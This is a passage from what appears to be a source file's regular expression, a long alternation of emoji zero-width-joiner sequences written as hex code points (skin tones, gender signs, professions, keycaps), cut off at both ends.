{2640}|\x{1f6a3}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d7}\x{200d}\x{2642}\x{fe0f}|\x{1f93d}\x{1f3ff}\x{200d}\x{2642}|\x{1f93e}\x{200d}\x{2640}\x{fe0f}|\x{1f93e}\x{1f3ff}\x{200d}\x{2642}|\x{1f93e}\x{1f3fe}\x{200d}\x{2642}|\x{1f93e}\x{1f3fd}\x{200d}\x{2642}|\x{1f93e}\x{1f3fc}\x{200d}\x{2642}|\x{1f93e}\x{1f3fb}\x{200d}\x{2642}|\x{1f93e}\x{200d}\x{2642}\x{fe0f}|\x{1f93d}\x{1f3ff}\x{200d}\x{2640}|\x{1f93d}\x{1f3fe}\x{200d}\x{2640}|\x{1f93d}\x{1f3fd}\x{200d}\x{2640}|\x{1f93d}\x{1f3fc}\x{200d}\x{2640}|\x{1f93d}\x{1f3fb}\x{200d}\x{2640}|\x{1f93d}\x{200d}\x{2640}\x{fe0f}|\x{1f93d}\x{1f3fe}\x{200d}\x{2642}|\x{1f93e}\x{1f3fc}\x{200d}\x{2640}|\x{1f93d}\x{1f3fd}\x{200d}\x{2642}|\x{1f93d}\x{1f3fc}\x{200d}\x{2642}|\x{1f93d}\x{1f3fb}\x{200d}\x{2642}|\x{1f93d}\x{200d}\x{2642}\x{fe0f}|\x{1f93c}\x{200d}\x{2640}\x{fe0f}|\x{1f93c}\x{200d}\x{2642}\x{fe0f}|\x{1f938}\x{1f3ff}\x{200d}\x{2640}|\x{1f938}\x{1f3fe}\x{200d}\x{2640}|\x{1f938}\x{1f3fd}\x{200d}\x{2640}|\x{1f938}\x{1f3fc}\x{200d}\x{2640}|\x{1f938}\x{1f3fb}\x{200d}\x{2640}|\x{1f938}\x{200d}\x{2640}\x{fe0f}|\x{1f938}\x{1f3ff}\x{200d}\x{2642}|\x{1f938}\x{1f3fe}\x{200d}\x{2642}|\x{1f93e}\x{1f3fb}\x{200d}\x{2640}|\x{1f93e}\x{1f3fd}\x{200d}\x{2640}|\x{1f938}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d8}\x{1f3fc}\x{200d}\x{2642}|\x{1f3f4}\x{200d}\x{2620}\x{fe0f}|\x{1f3f3}\x{fe0f}\x{200d}\x{1f308}|\x{1f9d8}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d8}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d8}\x{1f3fd}\x{200d}\x{2640}|\x{1f441}\x{200d}\x{1f5e8}\x{fe0f}|\x{1f441}\x{fe0f}\x{200d}\x{1f5e8}|\x{1f9d8}\x{1f3fc}\x{200d}\x{2640}|\x{1f9d8}\x{1f3fb}\x{200d}\x{2640}|\x{1f9d8}\x{200d}\x{2640}\x{fe0f}|\x{1f9d8}\x{1f3ff}\x{200d}\x{2642}|\x{1f9d8}\x{1f3fe}\x{200d}\x{2642}|\x{1f9d8}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d8}\x{1f3fb}\x{200d}\x{2642}|\x{1f93e}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d8}\x{200d}\x{2642}\x{fe0f}|\x{1f939}\x{1f3ff}\x{200d}\x{2640}|\x{1f939}\x{1f3fe}\x{200d}\x{2640}|\x{1f939}\x{1f3fd}\x{200d}\x{2640}|\x{1f939}\x{1f3fc}\x{200d}\x{2640}|\x{1f939}\x{1f3fb}\x{200d}\x{2640}|\x{1f939}\x{200d}\x{2640}\x{fe0f}|\x{1f939}\x{1f3ff}\x{200d}\x{2642}|\x{1f939}\x{1f3fe}\x{200d}\x{2642}|\x{1f939}\x{1f3fd}\x{200d}\x{2642}|\x{1f939}\x{1f3fc}\x{200d}\x{2642}|\x{1f939}\x{1f3fb}\x{200d}\x{2642}|\x{1f939}\x{200d}\x{2642}\x{fe0f}|\x{1f93e}\x{1f3ff}\x{200d}\x{2640}|\x{1f938}\x{1f3fd}\x{200d}\x{2642}|\x{1f938}\x{1f3fb}\x{200d}\x{2642}|\x{1f3ca}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3fd}\x{200d}\x{2642}|\x{1f3cb}\x{1f3fc}\x{200d}\x{2642}|\x{1f3cb}\x{1f3fb}\x{200d}\x{2642}|\x{1f3cb}\x{fe0f}\x{200d}\x{2642}|\x{1f3cb}\x{200d}\x{2642}\x{fe0f}|\x{26f9}\x{1f3ff}\x{200d}\x{2640}|\x{26f9}\x{1f3fe}\x{200d}\x{2640}|\x{26f9}\x{1f3fd}\x{200d}\x{2640}|\x{26f9}\x{1f3fc}\x{200d}\x{2640}|\x{26f9}\x{1f3fb}\x{200d}\x{2640}|\x{26f9}\x{fe0f}\x{200d}\x{2640}|\x{26f9}\x{200d}\x{2640}\x{fe0f}|\x{26f9}\x{1f3ff}\x{200d}\x{2642}|\x{26f9}\x{1f3fe}\x{200d}\x{2642}|\x{26f9}\x{1f3fc}\x{200d}\x{2642}|\x{1f3cb}\x{1f3fe}\x{200d}\x{2642}|\x{26f9}\x{1f3fb}\x{200d}\x{2642}|\x{26f9}\x{fe0f}\x{200d}\x{2642}|\x{26f9}\x{200d}\x{2642}\x{fe0f}|\x{1f3ca}\x{1f3ff}\x{200d}\x{2640}|\x{1f3ca}\x{1f3fe}\x{200d}\x{2640}|\x{1f3ca}\x{1f3fd}\x{200d}\x{2640}|\x{1f3ca}\x{1f3fc}\x{200d}\x{2640}|\x{1f3ca}\x{1f3fb}\x{200d}\x{2640}|\x{1f3ca}\x{200d}\x{2640}\x{fe0f}|\x{1f3ca}\x{1f3ff}\x{200d}\x{2642}|\x{1f3ca}\x{1f3fe}\x{200d}\x{2642}|\x{1f3ca}\x{1f3fd}\x{200d}\x{2642}|\x{1f3ca}\x{1f3fc}\x{200d}\x{2642}|\x{1f3ca}\x{1f3fb}\x{200d}\x{2642}|\x{1f3cb}\x{1f3fd}\x{200d}\x{2642}|\x{1f3cb}\x{1f3ff}\x{200d}\x{2642}|\x{1f938}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3fd}\x{200d}\x{2640}|\x{1f6b5}\x{1f3ff}\x{200d}\x{2640}|\x{1f6b5}\x{1f3fe}\x{200d}\x{2640}|\x{1f6b5}\x{1f3fd}\x{200d}\x{2640}|\x{1f6b5}\x{1f3fc}\x{200d}\x{2640}|\x{1f6b5}\x{1f3fb}\x{200d}\x{2640}|\x{1f6b5}\x{200d}\x{2640}\x{fe0f}|\x{1f6b5}\x{1f3ff}\x{200d}\x{2642}|\x{1f6b5}\x{1f3fe}\x{200d}\x{2642}|\x{1f6b5}\x{1f3fd}\x{200d}\x{2642}|\x{1f6b5}\x{1f3fc}\x{200d}\x{2642}|\x{1f6b5}\x{1f3fb}\x{200d}\x{2642}|\x{1f6b5}\x{200d}\x{2642}\x{fe0f}|\x{1f6b4}\x{1f3ff}\x{200d}\x{2640}|\x{1f6b4}\x{1f3fe}\x{200d}\x{2640}|\x{1f6b4}\x{1f3fc}\x{200d}\x{2640}|\x{1f3cb}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3fb}\x{200d}\x{2640}|\x{1f6b4}\x{200d}\x{2640}\x{fe0f}|\x{1f6b4}\x{1f3ff}\x{200d}\x{2642}|\x{1f6b4}\x{1f3fe}\x{200d}\x{2642}|\x{1f6b4}\x{1f3fd}\x{200d}\x{2642}|\x{1f6b4}\x{1f3fc}\x{200d}\x{2642}|\x{1f6b4}\x{1f3fb}\x{200d}\x{2642}|\x{1f6b4}\x{200d}\x{2642}\x{fe0f}|\x{1f3cb}\x{1f3ff}\x{200d}\x{2640}|\x{1f3cb}\x{1f3fe}\x{200d}\x{2640}|\x{1f3cb}\x{1f3fd}\x{200d}\x{2640}|\x{1f3cb}\x{1f3fc}\x{200d}\x{2640}|\x{1f3cb}\x{1f3fb}\x{200d}\x{2640}|\x{1f3cb}\x{fe0f}\x{200d}\x{2640}|\x{1f64d}\x{1f3ff}\x{200d}\x{2640}|\x{1f471}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d6}\x{1f3ff}\x{200d}\x{2640}|\x{1f468}\x{1f3fd}\x{200d}\x{1f33e}|\x{1f937}\x{1f3fd}\x{200d}\x{2642}|\x{1f937}\x{1f3fe}\x{200d}\x{2642}|\x{1f937}\x{1f3ff}\x{200d}\x{2642}|\x{1f937}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9bc}|\x{1f468}\x{1f3ff}\x{200d}\x{1f33e}|\x{1f937}\x{1f3fb}\x{200d}\x{2640}|\x{1f937}\x{1f3fc}\x{200d}\x{2640}|\x{1f937}\x{1f3fd}\x{200d}\x{2640}|\x{1f468}\x{1f3fe}\x{200d}\x{1f33e}|\x{1f937}\x{1f3fe}\x{200d}\x{2640}|\x{1f937}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d1}\x{200d}\x{2695}\x{fe0f}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9bc}|\x{1f937}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2695}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2695}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2695}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2695}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2695}|\x{1f468}\x{200d}\x{2695}\x{fe0f}|\x{1f468}\x{1f3fc}\x{200d}\x{1f33e}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9bc}|\x{1f468}\x{1f3fb}\x{200d}\x{2695}|\x{1f468}\x{1f3fc}\x{200d}\x{2695}|\x{1f468}\x{1f3fd}\x{200d}\x{2695}|\x{1f468}\x{1f3fe}\x{200d}\x{2695}|\x{1f468}\x{1f3ff}\x{200d}\x{2695}|\x{1f469}\x{200d}\x{2695}\x{fe0f}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9bc}|\x{1f937}\x{1f3fb}\x{200d}\x{2642}|\x{1f469}\x{1f3fb}\x{200d}\x{2695}|\x{1f926}\x{1f3fc}\x{200d}\x{2640}|\x{1f468}\x{1f3ff}\x{200d}\x{2696}|\x{1f926}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9bd}|\x{1f926}\x{1f3fb}\x{200d}\x{2642}|\x{1f926}\x{1f3fc}\x{200d}\x{2642}|\x{1f926}\x{1f3fd}\x{200d}\x{2642}|\x{1f926}\x{1f3fe}\x{200d}\x{2642}|\x{1f926}\x{1f3ff}\x{200d}\x{2642}|\x{1f926}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9bd}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f373}|\x{1f926}\x{1f3fb}\x{200d}\x{2640}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f373}|\x{1f926}\x{1f3fd}\x{200d}\x{2640}|\x{1f469}\x{1f3fb}\x{200d}\x{1f33e}|\x{1f926}\x{1f3fe}\x{200d}\x{2640}|\x{1f926}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9bc}|\x{1f469}\x{1f3ff}\x{200d}\x{1f33e}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9bd}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9bd}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9bd}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9bd}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9bd}|\x{1f469}\x{1f3fe}\x{200d}\x{1f33e}|\x{1f937}\x{200d}\x{2642}\x{fe0f}|\x{1f9d6}\x{1f3fe}\x{200d}\x{2640}|\x{1f469}\x{1f3fd}\x{200d}\x{1f33e}|\x{1f469}\x{1f3fc}\x{200d}\x{1f33e}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9bc}|\x{1f469}\x{1f3fc}\x{200d}\x{2695}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9bd}|\x{1f469}\x{1f3fd}\x{200d}\x{2696}|\x{1f468}\x{1f3fc}\x{200d}\x{1f3eb}|\x{1f468}\x{1f3fd}\x{200d}\x{1f3eb}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9bc}|\x{1f468}\x{1f3fe}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3ff}\x{200d}\x{2696}|\x{1f468}\x{1f3ff}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3fe}\x{200d}\x{2696}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9bc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3fc}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3fd}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3fe}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3ff}\x{200d}\x{1f3eb}|\x{1f9d1}\x{200d}\x{2696}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9bc}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9bc}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2696}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2696}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2696}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2696}|\x{1f469}\x{1f3fc}\x{200d}\x{2696}|\x{1f9d1}\x{1f3ff}\x{200d}\x{2696}|\x{1f468}\x{200d}\x{2696}\x{fe0f}|\x{1f469}\x{1f3fb}\x{200d}\x{2696}|\x{1f468}\x{1f3fb}\x{200d}\x{2696}|\x{1f468}\x{1f3fc}\x{200d}\x{2696}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9bc}|\x{1f469}\x{200d}\x{2696}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{2696}|\x{1f468}\x{1f3fb}\x{200d}\x{1f3eb}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f3eb}|\x{1f469}\x{1f3fd}\x{200d}\x{2695}|\x{1f468}\x{1f3fe}\x{200d}\x{1f393}|\x{1f469}\x{1f3fe}\x{200d}\x{2695}|\x{1f468}\x{1f3fb}\x{200d}\x{1f33e}|\x{1f469}\x{1f3ff}\x{200d}\x{2695}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9bc}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9bc}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f33e}|\x{1f468}\x{1f3fb}\x{200d}\x{1f393}|\x{1f468}\x{1f3fc}\x{200d}\x{1f393}|\x{1f468}\x{1f3fd}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f33e}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f3eb}|\x{1f468}\x{1f3ff}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f33e}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9bc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f393}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f33e}|\x{1f469}\x{1f3fc}\x{200d}\x{1f393}|\x{1f469}\x{1f3fd}\x{200d}\x{1f393}|\x{1f469}\x{1f3fe}\x{200d}\x{1f393}|\x{1f469}\x{1f3ff}\x{200d}\x{1f393}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9bc}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f3eb}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f3eb}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f3eb}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f33e}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9bd}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9bd}|\x{1f468}\x{1f3fe}\x{200d}\x{2696}|\x{1f481}\x{1f3fd}\x{200d}\x{2642}|\x{1f646}\x{1f3fe}\x{200d}\x{2640}|\x{1f646}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d6}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fd}\x{200d}\x{2640}|\x{1f46f}\x{200d}\x{2640}\x{fe0f}|\x{1f64e}\x{1f3fc}\x{200d}\x{2640}|\x{1f46f}\x{200d}\x{2642}\x{fe0f}|\x{1f3c3}\x{1f3ff}\x{200d}\x{2640}|\x{1f481}\x{200d}\x{2642}\x{fe0f}|\x{1f481}\x{1f3fb}\x{200d}\x{2642}|\x{1f481}\x{1f3fc}\x{200d}\x{2642}|\x{1f481}\x{1f3fe}\x{200d}\x{2642}|\x{1f646}\x{1f3fc}\x{200d}\x{2640}|\x{1f481}\x{1f3ff}\x{200d}\x{2642}|\x{1f481}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fe}\x{200d}\x{2640}|\x{1f64e}\x{1f3fb}\x{200d}\x{2640}|\x{1f481}\x{1f3fb}\x{200d}\x{2640}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f373}|\x{1f481}\x{1f3fc}\x{200d}\x{2640}|\x{1f481}\x{1f3fd}\x{200d}\x{2640}|\x{1f481}\x{1f3fe}\x{200d}\x{2640}|\x{1f481}\x{1f3ff}\x{200d}\x{2640}|\x{1f3c3}\x{1f3fd}\x{200d}\x{2640}|\x{1f3c3}\x{1f3fc}\x{200d}\x{2640}|\x{1f646}\x{1f3fd}\x{200d}\x{2640}|\x{1f646}\x{1f3fb}\x{200d}\x{2640}|\x{1f9d6}\x{200d}\x{2640}\x{fe0f}|\x{1f645}\x{1f3fd}\x{200d}\x{2640}|\x{1f9d6}\x{1f3ff}\x{200d}\x{2642}|\x{1f645}\x{200d}\x{2642}\x{fe0f}|\x{1f645}\x{1f3fb}\x{200d}\x{2642}|\x{1f645}\x{1f3fc}\x{200d}\x{2642}|\x{1f645}\x{1f3fd}\x{200d}\x{2642}|\x{1f645}\x{1f3fe}\x{200d}\x{2642}|\x{1f645}\x{1f3ff}\x{200d}\x{2642}|\x{1f645}\x{200d}\x{2640}\x{fe0f}|\x{1f9d6}\x{1f3fe}\x{200d}\x{2642}|\x{1f645}\x{1f3fb}\x{200d}\x{2640}|\x{1f645}\x{1f3fc}\x{200d}\x{2640}|\x{1f9d6}\x{1f3fb}\x{200d}\x{2640}|\x{1f645}\x{1f3fe}\x{200d}\x{2640}|\x{1f64e}\x{1f3fe}\x{200d}\x{2640}|\x{1f645}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d6}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d6}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d6}\x{1f3fb}\x{200d}\x{2642}|\x{1f646}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3ff}\x{200d}\x{2640}|\x{1f646}\x{1f3fb}\x{200d}\x{2642}|\x{1f646}\x{1f3fc}\x{200d}\x{2642}|\x{1f646}\x{1f3fd}\x{200d}\x{2642}|\x{1f646}\x{1f3fe}\x{200d}\x{2642}|\x{1f646}\x{1f3ff}\x{200d}\x{2642}|\x{1f646}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fb}\x{200d}\x{2640}|\x{1f64b}\x{200d}\x{2642}\x{fe0f}|\x{1f64b}\x{1f3fb}\x{200d}\x{2642}|\x{1f647}\x{1f3fe}\x{200d}\x{2642}|\x{1f9cf}\x{1f3ff}\x{200d}\x{2640}|\x{1f3c3}\x{1f3fb}\x{200d}\x{2642}|\x{1f64e}\x{1f3fe}\x{200d}\x{2642}|\x{1f3c3}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9bd}|\x{1f647}\x{200d}\x{2642}\x{fe0f}|\x{1f64e}\x{1f3fd}\x{200d}\x{2642}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9bd}|\x{1f647}\x{1f3fb}\x{200d}\x{2642}|\x{1f647}\x{1f3fc}\x{200d}\x{2642}|\x{1f647}\x{1f3fd}\x{200d}\x{2642}|\x{1f647}\x{1f3ff}\x{200d}\x{2642}|\x{1f9d6}\x{1f3fc}\x{200d}\x{2640}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9bd}|\x{1f647}\x{1f3fb}\x{200d}\x{2640}|\x{1f647}\x{1f3fc}\x{200d}\x{2640}|\x{1f64e}\x{1f3fc}\x{200d}\x{2642}|\x{1f64e}\x{1f3fb}\x{200d}\x{2642}|\x{1f64e}\x{200d}\x{2642}\x{fe0f}|\x{1f647}\x{1f3fd}\x{200d}\x{2640}|\x{1f647}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d6}\x{1f3fd}\x{200d}\x{2640}|\x{1f647}\x{1f3ff}\x{200d}\x{2640}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9bd}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9bd}|\x{1f9cf}\x{1f3fe}\x{200d}\x{2640}|\x{1f9cf}\x{1f3fd}\x{200d}\x{2640}|\x{1f9cf}\x{1f3fc}\x{200d}\x{2640}|\x{1f9cf}\x{1f3fb}\x{200d}\x{2640}|\x{1f64e}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fc}\x{200d}\x{2642}|\x{1f64b}\x{1f3fd}\x{200d}\x{2642}|\x{1f64b}\x{1f3fe}\x{200d}\x{2642}|\x{1f64b}\x{1f3ff}\x{200d}\x{2642}|\x{1f64b}\x{200d}\x{2640}\x{fe0f}|\x{1f64b}\x{1f3fb}\x{200d}\x{2640}|\x{1f64b}\x{1f3fc}\x{200d}\x{2640}|\x{1f64b}\x{1f3fd}\x{200d}\x{2640}|\x{1f64b}\x{1f3fe}\x{200d}\x{2640}|\x{1f64b}\x{1f3ff}\x{200d}\x{2640}|\x{1f3c3}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3ff}\x{200d}\x{2642}|\x{1f3c3}\x{1f3fe}\x{200d}\x{2642}|\x{1f3c3}\x{1f3fd}\x{200d}\x{2642}|\x{1f9cf}\x{200d}\x{2642}\x{fe0f}|\x{1f9cf}\x{1f3fb}\x{200d}\x{2642}|\x{1f9cf}\x{1f3fc}\x{200d}\x{2642}|\x{1f9cf}\x{1f3fd}\x{200d}\x{2642}|\x{1f9cf}\x{1f3fe}\x{200d}\x{2642}|\x{1f9cf}\x{1f3ff}\x{200d}\x{2642}|\x{1f64e}\x{1f3ff}\x{200d}\x{2642}|\x{1f9cf}\x{200d}\x{2640}\x{fe0f}|\x{1f3c3}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f373}|\x{1f3f4}\x{200d}\x{2620}|\x{1f939}\x{200d}\x{2642}|\x{1f3f3}\x{200d}\x{1f308}|\x{1f469}\x{200d}\x{1f466}|\x{0039}\x{fe0f}\x{20e3}|\x{1f9d8}\x{200d}\x{2640}|\x{1f468}\x{200d}\x{1f467}|\x{1f468}\x{200d}\x{1f466}|\x{1f415}\x{200d}\x{1f9ba}|\x{0023}\x{fe0f}\x{20e3}|\x{002a}\x{fe0f}\x{20e3}|\x{0030}\x{fe0f}\x{20e3}|\x{0031}\x{fe0f}\x{20e3}|\x{0032}\x{fe0f}\x{20e3}|\x{0038}\x{fe0f}\x{20e3}|\x{0033}\x{fe0f}\x{20e3}|\x{1f9dc}\x{200d}\x{2640}|\x{1f9d8}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f467}|\x{0035}\x{fe0f}\x{20e3}|\x{0036}\x{fe0f}\x{20e3}|\x{0037}\x{fe0f}\x{20e3}|\x{1f939}\x{200d}\x{2640}|\x{0034}\x{fe0f}\x{20e3}|\x{1f9df}\x{200d}\x{2640}|\x{1f93e}\x{200d}\x{2640}|\x{1f3c3}\x{200d}\x{2640}|\x{1f486}\x{200d}\x{2640}|\x{1f3ca}\x{200d}\x{2642}|\x{1f6a3}\x{200d}\x{2640}|\x{1f487}\x{200d}\x{2642}|\x{1f6a3}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f9bd}|\x{1f487}\x{200d}\x{2640}|\x{1f3c4}\x{200d}\x{2640}|\x{1f3c4}\x{200d}\x{2642}|\x{1f6b6}\x{200d}\x{2642}|\x{1f3c3}\x{200d}\x{2642}|\x{1f6b6}\x{200d}\x{2640}|\x{1f3ca}\x{200d}\x{2640}|\x{1f9ce}\x{200d}\x{2640}|\x{1f9cd}\x{200d}\x{2642}|\x{1f46f}\x{200d}\x{2642}|\x{1f46f}\x{200d}\x{2640}|\x{1f9d6}\x{200d}\x{2642}|\x{1f3cc}\x{200d}\x{2642}|\x{1f9ce}\x{200d}\x{2642}|\x{1f9d7}\x{200d}\x{2640}|\x{1f9d6}\x{200d}\x{2640}|\x{1f9cd}\x{200d}\x{2640}|\x{1f9d7}\x{200d}\x{2642}|\x{1f468}\x{200d}\x{1f9bd}|\x{1f486}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f9af}|\x{1f6b5}\x{200d}\x{2640}|\x{1f468}\x{200d}\x{1f9bc}|\x{1f93e}\x{200d}\x{2642}|\x{1f9dd}\x{200d}\x{2642}|\x{1f93d}\x{200d}\x{2640}|\x{1f93d}\x{200d}\x{2642}|\x{1f93c}\x{200d}\x{2640}|\x{1f93c}\x{200d}\x{2642}|\x{1f938}\x{200d}\x{2640}|\x{1f938}\x{200d}\x{2642}|\x{1f9dd}\x{200d}\x{2640}|\x{1f468}\x{200d}\x{1f9af}|\x{1f469}\x{200d}\x{1f9bc}|\x{1f9d1}\x{200d}\x{1f9bd}|\x{1f6b5}\x{200d}\x{2642}|\x{1f6b4}\x{200d}\x{2640}|\x{1f6b4}\x{200d}\x{2642}|\x{1f3cb}\x{200d}\x{2640}|\x{1f3cb}\x{200d}\x{2642}|\x{1f9d1}\x{200d}\x{1f9af}|\x{26f9}\x{200d}\x{2640}|\x{1f9de}\x{200d}\x{2642}|\x{1f9de}\x{200d}\x{2640}|\x{26f9}\x{200d}\x{2642}|\x{1f9df}\x{200d}\x{2642}|\x{1f9d1}\x{200d}\x{1f9bc}|\x{1f3cc}\x{200d}\x{2640}|\x{1f9dc}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f9b0}|\x{1f468}\x{200d}\x{1f9b1}|\x{1f468}\x{200d}\x{1f9b3}|\x{1f468}\x{200d}\x{1f9b2}|\x{1f9d1}\x{200d}\x{1f33e}|\x{1f468}\x{200d}\x{1f33e}|\x{1f469}\x{200d}\x{1f33e}|\x{1f9d1}\x{200d}\x{1f373}|\x{1f468}\x{200d}\x{1f373}|\x{1f469}\x{200d}\x{1f373}|\x{1f9d1}\x{200d}\x{1f527}|\x{1f9d1}\x{200d}\x{1f9b0}|\x{1f469}\x{200d}\x{2696}|\x{1f469}\x{200d}\x{1f9b1}|\x{1f9d1}\x{200d}\x{1f9b1}|\x{1f469}\x{200d}\x{1f9b3}|\x{1f9d1}\x{200d}\x{1f9b3}|\x{1f469}\x{200d}\x{1f9b2}|\x{1f9d1}\x{200d}\x{1f9b2}|\x{1f471}\x{200d}\x{2640}|\x{1f471}\x{200d}\x{2642}|\x{1f468}\x{200d}\x{1f527}|\x{1f9d1}\x{200d}\x{1f3ed}|\x{1f468}\x{200d}\x{1f9b0}|\x{1f481}\x{200d}\x{2642}|\x{1f477}\x{200d}\x{2640}|\x{1f9d1}\x{200d}\x{2695}|\x{1f647}\x{200d}\x{2640}|\x{1f647}\x{200d}\x{2642}|\x{1f926}\x{200d}\x{2642}|\x{1f926}\x{200d}\x{2640}|\x{1f937}\x{200d}\x{2642}|\x{1f473}\x{200d}\x{2640}|\x{1f473}\x{200d}\x{2642}|\x{1f9cf}\x{200d}\x{2640}|\x{1f9cf}\x{200d}\x{2642}|\x{1f937}\x{200d}\x{2640}|\x{1f468}\x{200d}\x{2695}|\x{1f481}\x{200d}\x{2640}|\x{1f469}\x{200d}\x{2695}|\x{1f9d1}\x{200d}\x{1f393}|\x{1f468}\x{200d}\x{1f393}|\x{1f64b}\x{200d}\x{2640}|\x{1f64b}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f393}|\x{1f9d1}\x{200d}\x{1f3eb}|\x{1f468}\x{200d}\x{1f3eb}|\x{1f469}\x{200d}\x{1f3eb}|\x{1f9d1}\x{200d}\x{2696}|\x{1f468}\x{200d}\x{2696}|\x{1f468}\x{200d}\x{1f3ed}|\x{1f469}\x{200d}\x{1f527}|\x{1f477}\x{200d}\x{2642}|\x{1f9d1}\x{200d}\x{1f680}|\x{1f64e}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f3ed}|\x{1f9da}\x{200d}\x{2642}|\x{1f9da}\x{200d}\x{2640}|\x{1f9d1}\x{200d}\x{1f3a8}|\x{1f468}\x{200d}\x{1f3a8}|\x{1f469}\x{200d}\x{1f3a8}|\x{1f9d1}\x{200d}\x{2708}|\x{1f468}\x{200d}\x{2708}|\x{1f469}\x{200d}\x{2708}|\x{1f468}\x{200d}\x{1f680}|\x{1f575}\x{200d}\x{2642}|\x{1f469}\x{200d}\x{1f680}|\x{1f441}\x{200d}\x{1f5e8}|\x{1f9d1}\x{200d}\x{1f692}|\x{1f64d}\x{200d}\x{2640}|\x{1f9db}\x{200d}\x{2642}|\x{1f9db}\x{200d}\x{2640}|\x{1f64d}\x{200d}\x{2642}|\x{1f468}\x{200d}\x{1f692}|\x{1f46e}\x{200d}\x{2640}|\x{1f46e}\x{200d}\x{2642}|\x{1f469}\x{200d